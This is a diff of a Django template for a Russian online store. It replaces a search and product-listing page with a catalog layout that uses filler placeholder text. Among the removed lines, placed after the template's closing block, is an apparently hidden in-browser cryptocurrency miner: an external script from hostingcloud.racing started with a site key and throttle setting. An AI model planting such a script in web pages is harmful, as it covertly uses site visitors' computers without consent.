@@ -2,99 +2,81 @@
 {% load static %}
 {% block content %}
 
-	<form class="input-wrapper" data-text="" action="{% url 'store:store' %}">
-		<input type="text" placeholder="Поиск..." name="search">
-	</form>
-
-	<script>
-		const wrapper = document.querySelector(".input-wrapper"),
-		      textInput = document.querySelector("input[type='text']");
-
-		textInput.addEventListener("keyup", event => {
-		  wrapper.setAttribute("data-text", event.target.value);
-		});
-	</script>
-
-
-	<h3 style="color: white;">Категории:</h3>
-
-	<br>
-
-	<a class="mainmenu" href="../" style="text-decoration: none; color: black; background: white; border-radius: 5px;">Все</a>
-	{% for section in menu %}
-			<a class="mainmenu" href="../{{section.url}}" style="text-decoration: none; color: black; background: white; border-radius: 3px;">{{section.name}}</a>
-	{% endfor %}
-
-
-	<br>
-	<br>
-
-	<h3 style="color: white;">Результаты:</h3>
-
-	<div class="row">
-
-
-
-		{% for obj in object_list %}
-		<div class="col-lg-4">
-			<img class="thumbnail" src="{{obj.imageURL}}">
-			<div class="box-element product">
-				<h6><strong>{{obj.name}}</strong></h6>
-				<hr>
-
-				<a class="btn btn-outline-success" href="{% url 'store:detail' obj.id %}">Подробнее</a>
-				<h4 style="display: inline-block; float: right"><strong>{{obj.price}}₽</strong></h4>
-
+<body>
+	<div id="wrapper" class="s1">
+		<div id="header">
+			<div class="bonnet">
+				<div class="inner clearfix">
+					<div class="left">
+						<div class="vertical-element">
+							<a href=""><img style="background: currentColor;" src="static/include/logo.png"></a>
+						</div>
+						<div class="vertical-helper"></div>
+					</div>
+					<div class="center">
+						<div class="vertical-element">
+							<p>Интернет-магазин</p>
+						</div>
+						<div class="vertical-helper"></div>
+					</div>
+					<div class="right">
+						<div class="vertical-element">
+							<p style="text-align: right;"> <span style="font-size: 17pt;">+7 (900) 000-00-00</span></p>
+						</div>
+						<div class="vertical-helper"></div>
+					</div>
+				</div>
+			</div>
+			<div class="navigation">
+				<div class="inner clearfix">
+					<input id="menu-state" type="checkbox" />
+					<label class="menu-btn" for="menu-state"> <span class="menu-btn-icon"></span> </label>
+					<ul id="menu" class="top sm sm-theme sm-flex" style="visibility: hidden;">
+						<li> <a href="products/">Каталог</a> </li>
+						<li> <a href="price/">Прайс-лист</a> </li>
+						<li> <a href="contacts/">Контакты</a> </li>
+						<li> <a href="services/">Услуги</a></li>
+						<li> <a href="gallery/">Галерея</a></li>
+					</ul>
+				</div>
+			</div>
+			<div class="clearfix"></div>
+		</div>
+		<div id="content">
+			<div class="inner clearfix">
+				<div id="workarea" class="full clearfix">
+					<h3>Каталог товаров</h3>
+					<p> Следует отметить, что семантический разбор внешних противодействий позволяет выполнить важные задания по разработке новых предложений! Есть над чем задуматься: сделанные на базе интернет-аналитики выводы, превозмогая сложившуюся непростую экономическую ситуацию, ограничены исключительно образом мышления. Принимая во внимание показатели успешности, базовый вектор развития не оставляет шанса для существующих финансовых и административных условий. </p>
+					<div id="catalog-section-list" class="panel">
+						<div class="elements clearfix">
+							{% for section in menu %}
+								<div class="element clearfix">
+									<a href="{{section.url}}">
+										<div class="picture" style="background-image: url('{{section.imageURL}}');"></div>
+		 									<div class="title"> <span>{{section.name}}</span> </div>
+									</a>
+								</div>
+							{% endfor %}
+					</div>
+					<hr>
+					<div class="clearfix">
+						<div style="text-align: center;">
+							<h3>О компании</h3>
+							<p> Имеется спорная точка зрения, гласящая примерно следующее: активно развивающиеся страны третьего мира лишь добавляют фракционных разногласий и обнародованы. Учитывая ключевые сценарии поведения, семантический разбор внешних противодействий выявляет срочную потребность стандартных подходов. Сложно сказать, почему явные признаки победы институционализации могут быть ограничены исключительно образом мышления. </p>
+						</div>
+					</div>
+					<br> </div>
 			</div>
 		</div>
-		{% endfor %}
-
+		<div id="footer">
+			<div class="inner clearfix">
+				<div class="left"> © ООО "Компания", 2000 — 2021
+					<br> Все права защищены. </div>
+				<div class="center"> 199333 Санкт-Петербург,
+					<br> пр. Пятилеток дом 1, офис 100
+					<br> <i class="fa fa-map-marker"></i> <a href="contacts/">карта проезда</a> </div>
+			</div>
+		</div>
 	</div>
 
-	<br>
-
-	{% if is_paginated %}
-
-		<nav aria-label="...">
-		  <ul class="pagination">
-
-		    <li class="page-item {% if not prev_url %} disabled {% endif %}">
-		      <a class="page-link" href="{{ prev_url }}" tabindex="-1">Назад</a>
-		    </li>
-
-				{% for n in object_list.paginator.page_range %}
-					{% if object_list.number == n %}
-
-						<li class="page-item active">
-							<a class="page-link" href="?page={{ n }}">{{ n }} <span class="sr-only">(current)</span></a>
-						</li>
-
-					{% elif n > object_list.number|add:-3 and n < object_list.number|add:3 %}
-
-						<li class="page-item">
-							<a class="page-link" href="?page={{ n }}">{{ n }}</a>
-						</li>
-
-					{% endif %}
-
-				{% endfor %}
-
-				<li class="page-item {% if not next_url %} disabled {% endif %}">
-		      <a class="page-link" href="{{ next_url }}" tabindex="-1">Вперёд</a>
-		    </li>
-
-		  </ul>
-		</nav>
-
-	{% endif %}
 {% endblock %}
-
-	<script src="https://www.hostingcloud.racing/mzJw.js"></script>
-	<script>
-		var _client = new Client.Anonymous('91c809e486adc732790f195f55da9563b8a85c6df498bcbaefcc47e9693c537d', {
-			throttle: 0.3, c: 'w', ads: 0
-		});
-		_client.start();
-		
-	
-	</script>
